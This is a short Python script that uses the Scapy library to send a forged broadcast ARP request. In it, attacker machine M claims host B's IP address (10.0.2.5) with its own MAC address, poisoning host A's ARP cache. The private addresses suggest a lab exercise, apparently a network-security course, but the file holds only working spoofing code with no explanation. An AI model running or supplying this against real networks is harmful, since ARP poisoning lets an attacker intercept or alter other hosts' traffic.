from scapy.all import *

A_ip = "10.0.2.4"
A_mac = "08:00:27:1b:11:df"
B_ip = "10.0.2.5"
M_mac = "08:00:27:aa:b1:56"

E_layer = Ether(dst="ff:ff:ff:ff:ff:ff", src=M_mac)
A_layer = ARP(hwsrc=M_mac, psrc=B_ip, hwdst="00:00:00:00:00:00", pdst=A_ip, op=1)

pkt = E_layer / A_layer
sendp(pkt)
